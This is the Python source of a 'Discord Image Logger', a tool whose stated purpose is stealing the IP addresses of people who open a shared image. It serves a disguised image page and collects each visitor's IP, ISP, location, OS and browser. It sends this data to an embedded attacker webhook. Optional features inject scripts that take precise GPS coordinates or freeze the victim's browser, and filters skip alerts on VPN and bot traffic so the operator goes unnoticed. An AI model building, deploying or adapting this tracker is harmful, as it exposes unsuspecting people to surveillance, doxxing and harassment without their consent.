# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1193520355332063343/3ZB8zZgoTyAkO8nyqLTPRdRrxogkAi5IxRAwZxrMRnEranyCbD8aoKH7XR_uNdi9mHvn",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
